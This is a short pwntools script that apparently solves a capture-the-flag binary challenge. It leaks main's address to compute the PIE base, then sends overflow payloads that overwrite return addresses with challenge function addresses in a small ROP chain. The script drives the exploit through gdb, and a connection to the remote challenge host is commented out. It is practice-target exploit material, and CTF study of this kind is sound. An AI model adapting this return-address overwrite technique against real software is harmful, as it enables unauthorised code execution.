from pwn import *

# conn = remote('challs.wreckctf.com', 31009)
# conn.recvline()
    
# payload += cyclic(30)

# add null terminator
# payload += b'\x00'
# payload += b'helloworld'
# payload += b'\x00'

p = gdb.debug(["./challenge"], '''
    unset env LINES
    unset env COLUMNS
    break main
    ''')

main_address = str(p.recvline()).split('0x')[1].split(',')[0]
base_address = int(main_address, 16) - int('1535', 16)
lily_pad_address = base_address + int('1269', 16)
set_frog_address = base_address + int('1294', 16)
coin_address = base_address + int('12de', 16)
froggers_address = base_address + int('1328', 16)


init_address = base_address + int('1180', 16)


lily_pad_call_address = base_address + int('1180', 16)

payload = cyclic(0)
payload += b'aaaaaaaa'
payload += b'bbbbbbbb'
payload += b'deadbeef'
payload += p64(set_frog_address)
payload += p64(init_address)

p.sendline(payload)

# print("1" + str(p.recvline()))
# print("2" + str(p.recvline()))
# print("3" + str(p.recvline()))
# print("4" + str(p.recvline()))
# print("4" + str(p.recvline()))

# payload = b'test'

payload = cyclic(0)
payload += cyclic(24)
payload += p64(coin_address)
payload += p64(froggers_address)

p.sendline(payload)


p.interactive()


# conn.sendline(payload)
# conn.interactive()